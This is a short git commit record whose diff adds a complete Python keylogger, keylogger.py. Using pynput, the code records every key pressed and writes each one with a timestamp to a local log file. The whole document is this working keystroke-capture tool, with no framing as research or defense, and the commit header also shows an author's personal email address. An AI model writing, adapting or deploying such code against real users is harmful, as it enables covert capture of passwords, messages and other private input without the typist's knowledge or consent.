2c82bd0a8715a50dd02ac5be71e60f28fac28ea4
cleiton080 <cleitonpessoa53@hotmail.com>
2020-03-13 19:29:30 -0300

    listening the keys pressed

---
+++ keylogger.py
@@ -0,0 +1,12 @@
+from pynput.keyboard import Listener
+import logging
+
+def on_press(key):
+    logger.info(key)
+
+logging.basicConfig(filename="logs/keylogger.txt", filemode="w+", format="%(asctime)s %(message)s")
+logger = logging.getLogger()
+logger.setLevel(logging.INFO)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
